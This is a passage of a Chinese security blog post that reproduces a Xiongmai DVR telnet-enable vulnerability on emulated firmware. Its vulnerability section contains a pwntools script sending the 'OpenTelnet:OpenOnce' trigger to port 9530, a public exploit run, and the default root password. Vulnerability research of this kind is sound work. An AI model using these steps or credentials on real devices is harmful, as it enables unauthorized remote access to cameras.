@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Closure" />
+  <meta name="description" content="" />
+  <meta name="google-site-verification" content="ume8wxFIzFnN-uS2NK6TLbEnB0OL8U3QYLpG-0v0NPM" />
+  
+  
+  <title>
+    
+      雄迈摄像头漏洞复现 
+      
+      
+      |
+    
+     Closure
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Closure</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">雄迈摄像头漏洞复现</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-08-01 20:16:20
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/IOT%E5%AE%89%E5%85%A8/" title="IOT安全">
+                    #IOT安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="雄迈"><a href="#雄迈" class="headerlink" title="雄迈"></a>雄迈</h1><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;www.xiongmaitech.com&#x2F;en&#x2F;index.php</code></pre>
+
+<p>官方固件下载中心</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;baike.jftech.com&#x2F;download.html#</code></pre>
+
+
+
+<h2 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h2><p>型号：AHB7804R-LMS</p>
+<p>SimpGeneral_General_AHB7804R-LMS_V4.02.R11.Nat.20151228</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;file.sec-e.ru&#x2F;%D0%9E%D0%B1%D0%BE%D1%80%D1%83%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5%20Optimus&#x2F;%D0%9F%D1%80%D0%BE%D1%88%D0%B8%D0%B2%D0%BA%D0%B8%20%D0%B4%D0%BB%D1%8F%20%D0%BE%D0%B1%D0%BE%D1%80%D1%83%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F%20Optimus&#x2F;AHDR%20%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B0%D1%82%D0%BE%D1%80%D1%8B&#x2F;_%D0%90%D1%80%D1%85%D0%B8%D0%B2%D0%BD%D1%8B%D0%B5%20%D0%BC%D0%BE%D0%B4%D0%B5%D0%BB%D0%B8&#x2F;AHDR-2004CE&#x2F;2015-12-28&#x2F;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407251410803.png" alt="image-20240725141006810"></p>
+<p>提取固件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-Me</span> <span class="token punctuation">[</span>固件名<span class="token punctuation">]</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407251412306.png" alt="image-20240725141239253"></p>
+<p>固件中存在logo（猜测启动logo之类的），custom（猜测自定义程序），romfs（猜测是只读文件系统，也就是root了），user（猜测是包含用户数据和配置文件之类）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261021857.png" alt="image-20240726102006960"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261022097.png" alt="image-20240726102220054"></p>
+<p>查看一下文件内容，判断romfs就是后续要研究的文件系统&#x3D;&#x3D;》先看一下启动脚本：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">etc/init.d</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261024279.png" alt="image-20240726102404246"></p>
+<p><strong>rcS</strong></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261042873.png" alt="image-20240726104231826"></p>
+<p>执行了<strong>dnode</strong>，挂载了一些文件，可以看到挂载了两个文件系统为squashfs类型的块设备，对应文件名，应该就是刚刚的custom和user</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261028443.png" alt="image-20240726102801409"></p>
+<p>dnode里面是一些初始化设备节点和挂载之类的&#x3D;&#x3D;》继续rcS</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261047998.png" alt="image-20240726104718967"></p>
+<p>对一些文件进行了操作，执行了loadmod，并配置了网卡，后续模拟的话可能需要更改网卡信息</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261049306.png" alt="image-20240726104912278"></p>
+<p>想查看一下loadmode做了哪些操作，发现usr目录为空，结合启动脚本一开始的挂载块设备到usr和custom目录，不难得出为了后续模拟该文件系统，需要先将user内和custom内容的内容拷贝至romfs中的对应目录下，如图所示</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407251417505.png" alt="image-20240725141722435"></p>
+<p>拷贝最终结果：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407251528949.png" alt="image-20240725152833444"></p>
+<p>再次查看一下loadmode</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261053666.png" alt="image-20240726105352625"></p>
+<p>&#x3D;&#x3D;》依旧是对文件的一些处理&#x3D;&#x3D;》</p>
+<p><img src="C:/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20240726105820923.png" alt="image-20240726105820923"></p>
+<p>&#x3D;&#x3D;》对寄存器地址赋值，好像并没有什么比较重要的地方&#x3D;&#x3D;》继续rcS</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261101191.png" alt="image-20240726110138131"></p>
+<p>脚本运行了一些守护进程，例如telnet守护进程，允许远程telnet连接；然后启动了自定义应用之类的（extapp.sh），解压获取了Sofia，执行了dvrHelper，这里应该就是这个设备的主程序了，并且没有指定这个程序的路径就可以运行，应该是加入命令中了（busybox之类的）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261114794.png" alt="image-20240726111411774"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261350038.png" alt="image-20240726135017018"></p>
+<p>识别一下busybox是什么架构的：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261412135.png" alt="image-20240726141241104"></p>
+<p>IDA反编译一下这个busybox</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261122583.png" alt="image-20240726112236558"></p>
+<p>dvrHelper确实是被编译进去了</p>
+<p>暂时没有什么有用的信息了&#x3D;&#x3D;》固件模拟跑一下吧&#x3D;&#x3D;》</p>
+<h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://people.debian.org/<span class="token punctuation">\</span>~aurel32/qemu/armel/vmlinuz-3.2.0-4-versatile
+<span class="token function">wget</span> https://people.debian.org/<span class="token punctuation">\</span>~aurel32/qemu/armel/initrd.img-3.2.0-4-versatile
+<span class="token function">wget</span> https://people.debian.org/<span class="token punctuation">\</span>~aurel32/qemu/armel/debian_wheezy_armel_standard.qcow2
+
+<span class="token comment">#宿主机</span>
+<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> uml-utilities
+<span class="token function">sudo</span> tunctl <span class="token parameter variable">-t</span> tap0 <span class="token parameter variable">-u</span> <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>    <span class="token comment">#这边新建一张网卡和虚拟机进行通信</span>
+<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">192.168</span>.3.1/24
+
+<span class="token comment">#启动QEMU</span>
+<span class="token function">sudo</span> qemu-system-arm <span class="token parameter variable">-M</span> versatilepb <span class="token parameter variable">-kernel</span> vmlinuz-3.2.0-4-versatile <span class="token parameter variable">-initrd</span> initrd.img-3.2.0-4-versatile <span class="token parameter variable">-hda</span> debian_wheezy_armel_standard.qcow2 <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/sda1"</span> <span class="token parameter variable">-net</span> nic <span class="token parameter variable">-net</span> tap,ifname<span class="token operator">=</span>tap0,script<span class="token operator">=</span>no,downscript<span class="token operator">=</span>no <span class="token parameter variable">-nographic</span>
+
+<span class="token comment">#默认用户名密码都是root</span>
+<span class="token comment">#配置QEMU虚拟机网卡</span>
+<span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.3.2/24 up</code></pre>
+
+<p>宿主机：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407251533384.png" alt="image-20240725153333288"></p>
+<p>QEMU虚拟机：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407251439354.png" alt="image-20240725143918296"></p>
+<p>将文件系统传进QEMU系统内</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> <span class="token parameter variable">-r</span> squashfs-root root@192.168.3.2:/root</code></pre>
+
+<p>挂载dev和proc</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> <span class="token parameter variable">-o</span> <span class="token builtin class-name">bind</span> /dev ./squashfs-root/dev
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc /proc ./squashfs-root/proc</code></pre>
+
+<p>模拟设备shell</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> ./squashfs-root/ <span class="token function">sh</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261344650.png" alt="image-20240726134401627"></p>
+<p>&#x3D;&#x3D;》busybox的版本信息等</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261354515.png" alt="image-20240726135409486"></p>
+<p>&#x3D;&#x3D;》dvrHelper命令的一些相关输出，可以根据输出定位dvrHelper所在处理函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261414311.png" alt="image-20240726141447280"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261415465.png" alt="image-20240726141510425"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261416731.png" alt="image-20240726141602698"></p>
+<p>对应上dvrHelper所在位置&#x3D;&#x3D;》没什么有价值的信息&#x3D;&#x3D;》尝试让设备文件系统运行</p>
+<p>稍微修改一下设备初始化脚本文件：注释掉网卡配置和最后的启动程序，后续我们手动启动程序</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span>
+
+/etc/init.d/dnode
+<span class="token builtin class-name">echo</span> /sbin/mdev <span class="token operator">></span> /proc/sys/kernel/hotplug
+mdev <span class="token parameter variable">-s</span>
+
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> squashfs /dev/mtdblock2 /usr
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> squashfs /dev/mtdblock3 /mnt/custom
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> cramfs /dev/mtdblock4 /mnt/logo
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> jffs2 /dev/mtdblock5 /mnt/mtd
+
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> ramfs  /dev/mem        /var
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> usbfs none /proc/bus/usb/
+
+<span class="token comment">#ifconfig eth0 up</span>
+<span class="token comment">#ifconfig eth0 10.6.2.131</span>
+<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /mnt/mtd/Config /mnt/mtd/Log /mnt/mtd/Config/ppp /mnt/mtd/Config/Json
+<span class="token comment">#if [ ! -f /mnt/mtd/Config/HvrMode ] &amp;&amp; [ -f /mnt/custom/HvrMode ]; then</span>
+<span class="token comment">#	cp /mnt/custom/HvrMode /mnt/mtd/Config/</span>
+<span class="token comment">#fi</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable"><span class="token variable">`</span><span class="token function">sed</span> <span class="token parameter variable">-n</span> <span class="token string">'/MBD6804T-EL/p'</span> /mnt/custom/ProductDefinition <span class="token operator">|</span> <span class="token function">sed</span> <span class="token parameter variable">-n</span> <span class="token string">'/Hardware/p'</span><span class="token variable">`</span></span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>
+	<span class="token function">rm</span> /mnt/mtd/Config/HvrMode <span class="token parameter variable">-f</span>
+<span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> /mnt/mtd/Config/HvrMode <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /mnt/custom/HvrMode <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+	<span class="token function">cp</span> /mnt/custom/HvrMode /mnt/mtd/Config/
+<span class="token keyword">fi</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> /mnt/mtd/Config/ppp/3gdigal <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+	<span class="token function">chmod</span> <span class="token number">777</span> /mnt/mtd/Config/ppp/3gdigal
+<span class="token keyword">fi</span>
+<span class="token builtin class-name">cd</span> /usr/etc
+./loadmod
+<span class="token comment">#ifconfig eth0 up</span>
+<span class="token comment">#ifconfig eth0 192.168.3.2/24</span>
+
+routedaemon<span class="token operator">&amp;</span>
+dogtest <span class="token operator">&amp;</span>
+<span class="token comment">#BurnSataHub &amp;</span>
+telnetd <span class="token operator">&amp;</span>
+timecheck <span class="token operator">&amp;</span>
+macGuarder <span class="token operator">&amp;</span>
+
+<span class="token function">sleep</span> <span class="token number">3</span>
+netinit <span class="token operator">&amp;</span>
+<span class="token function">sleep</span> <span class="token number">2</span>
+
+/usr/etc/pppd pty /etc/ppp/pppoe-start <span class="token function">file</span> /etc/ppp/pppoe-options <span class="token operator">&amp;</span>
+
+/mnt/custom/extapp.sh <span class="token operator">&amp;</span>
+
+<span class="token comment">#unrar x /usr/bin/Sofia.rar /var/</span>
+<span class="token function">cp</span> /usr/bin/Sofia.tar.lzma /var/
+<span class="token builtin class-name">cd</span> /var/
+<span class="token function">tar</span> <span class="token parameter variable">-axf</span> /usr/bin/Sofia.tar.lzma
+
+<span class="token function">chmod</span> <span class="token number">777</span> /var/Sofia
+<span class="token function">rm</span> /var/Sofia.tar.lzma <span class="token parameter variable">-fr</span>
+<span class="token comment">#dvrHelper /lib/modules /var/Sofia 127.0.0.1 9578 1</span></code></pre>
+
+<p>上传覆盖脚本文件</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> rcS root@192.168.3.2:/root/squashfs-root/etc/init.d</code></pre>
+
+<p>在设备shell中运行初始化脚本</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261421428.png" alt="image-20240726142147378"></p>
+<p>挂载没文件是正常的，不影响，因为在上文中我们已经提前将custom和user并入文件系统中了</p>
+<p>此时你的虚拟机将因为初始化而发生变化&#x3D;&#x3D;》退出设备shell将其改回</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.3.2/24</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261430872.png" alt="image-20240726143003850"></p>
+<p>查看一下虚拟机的端口情况</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261431331.png" alt="image-20240726143127301"></p>
+<p>&#x3D;&#x3D;》由macGuarder监听的9530端口</p>
+<p>回到设备shell启动主程序</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> ./squashfs-root/ <span class="token function">sh</span>
+dvrHelper /lib/modules /var/Sofia <span class="token number">192.168</span>.3.2 <span class="token number">9578</span> <span class="token number">1</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261434002.png" alt="image-20240726143443959"></p>
+<p>再启动一个shell连接虚拟机（可以使用ssh等），查看端口情况</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261436424.png" alt="image-20240726143611370"></p>
+<p>&#x3D;&#x3D;》由dvrHelper监听的9527端口</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在互联网上寻找关于这个型号的相关漏洞，可以加快我们对这个设备的分析速度</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261448084.png" alt="image-20240726144838047"></p>
+<p>CVE-2021-41506和CVE-2020-22253都提到了macGuarder，并且提到了Telnet</p>
+<p>&#x3D;&#x3D;》分析一下9530，也就是macGuarder</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261449325.png" alt="image-20240725170953923"></p>
+<p>在CVE-2021-41506漏洞相关链接中有提到漏洞的触发条件&#x3D;&#x3D;》</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;habr.com&#x2F;en&#x2F;articles&#x2F;486856&#x2F;</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261453541.png" alt="image-20240726145330506"></p>
+<p>反编译定位字符串，当然，如果你发现你无法将这个符号文件拷贝下来分析，你也可以直接使用busybox，因为这个命令已经编译进去了，作为busybox的软链接存在</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311122973.png" alt="image-20240731112251902"></p>
+<p>OpenTelnet:OpenOnce</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261456759.png" alt="image-20240726145645734"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261500891.png" alt="image-20240726150018868"></p>
+<p>猜测v6应该是程序接收的消息的头指针，+1略过了1个字节，也就是长度字节&#x3D;&#x3D;》</p>
+<p><strong>exp</strong>：我这里其实是想发送OpenTelnet:OpenOnce看看它的返回的randNum是什么样子的，结果一直接受不到，并且在QEMU设备shell中是可以看到接收到了，并且还成功打开了Telnet</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"192.168.3.2"</span><span class="token punctuation">,</span><span class="token number">9530</span><span class="token punctuation">)</span>
+
+payload_1 <span class="token operator">=</span> <span class="token string">b"OpenTelnet:OpenOnce"</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_1<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_1<span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'send: '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<p>虚拟机设备shell：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261612185.png" alt="image-20240726161201163"></p>
+<p>虚拟机shell（这里我重启了一次QEMU，并没有启动dvrHelper）</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261612480.png" alt="image-20240726161243431"></p>
+<p>Telnet连接尝试：该用户密码可通过hashcat爆破等方式获取，一般都是默认</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011420667.png" alt="image-20240801142054631"></p>
+<pre class="language-none"><code class="language-none">User：root
+Password：xc3511</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407261615716.png" alt="image-20240726161512675"></p>
+<p>根据漏洞报告相关链接描述来说，应该还有一个类似密钥之类的验证，但是并未在此版本的固件中出现，通过randNum字符串定位也并没有找到；</p>
+<p>再根据另外一篇复现文章中：</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;nosec.org&#x2F;home&#x2F;detail&#x2F;4213.html
+
+#POC C版本
+https:&#x2F;&#x2F;github.com&#x2F;Snawoot&#x2F;hisilicon-dvr-telnet
+#POC py版本
+https:&#x2F;&#x2F;github.com&#x2F;tothi&#x2F;pwn-hisilicon-dvr</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311151253.png" alt="image-20240731115146019"></p>
+<p>可以发现POC只发送了OpenTelnet:OpenOnce，后续将由于没有返回randNum，POC也接收不到，就被迫挂着了，最后也是强制ctrl c结束，但是可以发现设备确实是启动了Telnet；</p>
+<h3 id="更换设备AHB7804R-LMS"><a href="#更换设备AHB7804R-LMS" class="headerlink" title="更换设备AHB7804R-LMS"></a>更换设备AHB7804R-LMS</h3><p>这次根据具体的版本号去获取固件</p>
+<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;file.sec-e.ru&#x2F;%D0%9E%D0%B1%D0%BE%D1%80%D1%83%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5%20Optimus&#x2F;%D0%9F%D1%80%D0%BE%D1%88%D0%B8%D0%B2%D0%BA%D0%B8%20%D0%B4%D0%BB%D1%8F%20%D0%BE%D0%B1%D0%BE%D1%80%D1%83%D0%B4%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D1%8F%20Optimus&#x2F;AHDR%20%D1%80%D0%B5%D0%B3%D0%B8%D1%81%D1%82%D1%80%D0%B0%D1%82%D0%BE%D1%80%D1%8B&#x2F;_%D0%90%D1%80%D1%85%D0%B8%D0%B2%D0%BD%D1%8B%D0%B5%20%D0%BC%D0%BE%D0%B4%D0%B5%D0%BB%D0%B8&#x2F;AHDR-2004CE&#x2F;131&#x2F;2017-03-01&#x2F;SimpGeneral_General_AHB7804R-LMS_V4.02.R11.Nat.20170301_NT.bin</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202408011407269.png" alt="image-20240801140745224"></p>
+<p>SimpGeneral_General_AHB7804R-LMS_V4.02.R11.Nat.20170301_NT</p>
+<p>提取固件后查看目标程序的软链接：同样都是busybox</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311127747.png" alt="image-20240731112701708"></p>
+<p>同样是通过字符串定位：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311131658.png" alt="image-20240731113155623"></p>
+<p>再通过交叉引用定位到函数：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311132570.png" alt="image-20240731113253521"></p>
+<p>再查找这个函数的引用：sub_2610C</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311140007.png" alt="image-20240731114024958"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311139982.png" alt="image-20240731113906947"></p>
+<p>发现此函数中出现的字符串与密钥等与漏洞报告链接描述高度吻合&#x3D;&#x3D;》</p>
+<h3 id="初步验证"><a href="#初步验证" class="headerlink" title="初步验证"></a>初步验证</h3><p>模拟运行：手动启动macGuarder，因为在这个版本的固件中的初始化脚本中并没有启用这项服务</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311418663.png" alt="image-20240731141833625"></p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311417668.png" alt="image-20240731141734634"></p>
+<p>发送OpenTelnet:OpenOnce测试一下：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"192.168.3.2"</span><span class="token punctuation">,</span><span class="token number">9530</span><span class="token punctuation">)</span>
+
+payload_1 <span class="token operator">=</span> <span class="token string">b"OpenTelnet:OpenOnce"</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_1<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload_1<span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'send: '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload_1<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+re_ret <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'recv: '</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>re_ret<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+
+<p>正如报告所言，返回了一个randNum</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311420890.png" alt="image-20240731142026866"></p>
+<p>证明这个程序正是我们要分析的目标，通过C版本的EXP打一波试试：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">./hs-dvr-telnet <span class="token number">192.168</span>.3.2 2wj9fsa2</code></pre>
+
+<p>执行效果：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311427332.png" alt="image-20240731142716295"></p>
+<p>成功去执行了telnetd命令，但是由于该版本的固件中并不存在这个命令，所以导致并无法完成利用</p>
+<p>SimpGeneral_General_AHB7804R-LMS_V4.02.R11.Nat.20170301_NT：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311444475.png" alt="image-20240731144422449"></p>
+<p>与SimpGeneral_General_AHB7804R-LMS_V4.02.R11.Nat.20151228对比：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/202407311451969.png" alt="image-20240731145152944"></p>
+<p>直接将20151228版本里的telnetd丢到20170301版本里：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">scp</span> telnetd root@192.168.3.2:/root/squashfs-root/sbin</code></pre>
+
+<p>修改rcS启动脚本，添加</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">macGuarder <span class="token operator">&amp;</span></code></pre>
+
+<p>记得将网卡配置和最后的dvrHelper注释</p>
